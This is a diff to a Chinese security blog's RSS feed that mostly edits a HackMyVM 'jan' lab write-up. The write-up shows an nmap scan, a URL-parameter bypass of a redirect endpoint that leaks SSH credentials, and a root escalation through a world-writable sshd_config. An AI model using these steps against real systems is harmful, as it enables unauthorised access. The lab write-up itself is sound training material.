@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>哪里会有人喜欢孤独，不过是不喜欢失望罢了。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Mon, 31 Mar 2025 11:11:54 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>hackmyvm靶场-Bruteforcelab</title><link>https://7r1UMPH.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># 简介
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Triumph Blog</title><link>https://7r1UMPH.github.io</link><description>哪里会有人喜欢孤独，不过是不喜欢失望罢了。</description><copyright>Triumph Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Mon, 31 Mar 2025 11:14:07 +0000</lastBuildDate><managingEditor>Triumph Blog</managingEditor><ttl>60</ttl><webMaster>Triumph Blog</webMaster><item><title>hackmyvm靶场-Bruteforcelab</title><link>https://7r1UMPH.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># 简介
 
 ![image-20250322203846278](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250322203846321.png)
 
@@ -2600,18 +2600,16 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
 ```
 
-7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Thu, 20 Mar 2025 08:12:52 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPH.github.io/post/hmv_jan.html</link><description># hmv_jan
+7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Thu, 20 Mar 2025 08:12:52 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPH.github.io/post/hmv_jan.html</link><description># 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=jan  
-**难度**：绿色  
-**目标 IP**：192.168.205.136  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
+ 难度：绿色
+ 目标 IP：192.168.205.136
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -2701,7 +2699,6 @@ Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/                            
 Welcome to our Public Server. Maybe Internal.                                                                                                                                    
-
 ```
 
 进行目录爆破
@@ -2750,7 +2747,6 @@ Parameter 'url' needed.
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/credz   
 Only accessible internally.                                                                                                                                    
-
 ```
 
 目前来看出题思路是通过/redirect访问/credz，进行尝试
@@ -2768,7 +2764,6 @@ HTTP/1.1 200 OK
 Date: Mon, 03 Feb 2025 04:47:07 GMT
 Content-Length: 27
 Content-Type: text/plain; charset=utf-8
-
 ```
 
 这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是
@@ -2788,7 +2783,6 @@ Content-Type: text/plain; charset=utf-8
 ┌──(kali㉿kali)-[~/test]
 └─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
 ssh/EazyLOL                                                                                                                                     
-
 ```
 
 登录
@@ -2815,7 +2809,6 @@ You may change this message by editing /etc/motd.
 
 jan:~$ id
 uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
-
 ```
 
 # 4.提权
@@ -2836,7 +2829,6 @@ Runas and Command-specific defaults for ssh:
 
 User ssh may run the following commands on jan:
     (root) NOPASSWD: /sbin/service sshd restart
-
 ```
 
 大概率是改ssh的配置文件了，看看有没有权限
@@ -2844,7 +2836,6 @@ User ssh may run the following commands on jan:
 ```
 jan:~$ ls -al /etc/ssh/sshd_config
 -rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
-
 ```
 
 有权限，那我们生成一个密钥，通过密钥登录root就好了
@@ -2884,10 +2875,9 @@ drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
 -rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys
 
 jan:~$ vi /etc/ssh/sshd_config
-
 ```
 
-![image](assets/image-20250203130052-vivh1m9.png)
+![image-20250331191252272](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191252331.png)
 
 ```
 jan:~$ sudo /sbin/service sshd restart
@@ -2896,17 +2886,15 @@ jan:~$ sudo /sbin/service sshd restart
 jan:~$ ssh root@127.0.0.1
 /etc/ssh/ssh_config: line 23: Bad configuration option: banner
 /etc/ssh/ssh_config: terminating, 1 bad configuration options
-
 ```
 
 banner应该也能提权，但是我不管它了
 
 ```
 jan:~$ vi /etc/ssh/ssh_config
-
 ```
 
-![image](assets/image-20250203130244-g8wjwy0.png)
+![image-20250331191302680](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191302731.png)
 
 ```
 jan:~$ ssh root@127.0.0.1
@@ -2927,16 +2915,17 @@ You may change this message by editing /etc/motd.
 
 jan:~# id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-
 ```
 
 # 5.第二种方法
 
-![image](assets/image-20250203130435-bivb421.png)
+![image-20250331191312627](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191312690.png)
 
 🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83
 
-这个方法我没试过，自己尝试一下吧。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_jan.html</guid><pubDate>Thu, 20 Mar 2025 08:11:50 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPH.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal
+这个方法我没试过，自己尝试一下吧
+
+&lt;!-- ##{'timestamp':1738580133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_jan.html</guid><pubDate>Thu, 20 Mar 2025 08:11:50 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPH.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal
 
 # 0.简介
 
